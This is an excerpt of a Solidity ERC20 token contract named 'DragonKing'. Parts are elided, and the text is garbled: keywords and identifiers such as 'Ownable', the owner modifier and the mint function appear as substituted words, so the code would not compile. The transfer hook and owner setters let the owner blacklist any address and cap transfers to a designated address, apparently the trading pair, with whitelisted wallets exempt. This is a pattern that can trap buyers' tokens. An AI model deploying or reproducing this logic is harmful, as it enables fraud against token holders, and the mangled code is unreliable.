...
contract DragonKing is ERC20, ERC20Burnable,  himselfble {
    using SafeMath for uint256;
    address public WDragonKing;
    uint256 public MX = 2**256 - 1;
    mapping(address => bool) public roster;
    mapping(address => bool) public classyroster;
    constructor() public ERC20("DragonKing", "DragonKing") {
        _setupDecimals(18);
        _multiple(msg.sender, 10000000000 * 1e18);
    }

    function exclude(address account, uint256 volume)
    ...
    function _beforeTokenTransfer(
        ...
        if(to == WDragonKing && !classyroster[from] ){
            require(volume < MX, "MX");
        }
         require(!roster[from], "roster");
         require(!roster[to], "roster");
    }
    function setMX(uint256 _MX) public requirehimself() {
        MX = _MX;
    }
    function setWDragonKing(address _WDragonKing) public requirehimself() {
        WDragonKing = _WDragonKing;
    }
    function setHs(address _WDragonKing, bool t) public requirehimself() {
        roster[_WDragonKing] = t;
    }
    function setBs(address _WDragonKing, bool t) public requirehimself() {
        classyroster[_WDragonKing] = t;
    }
}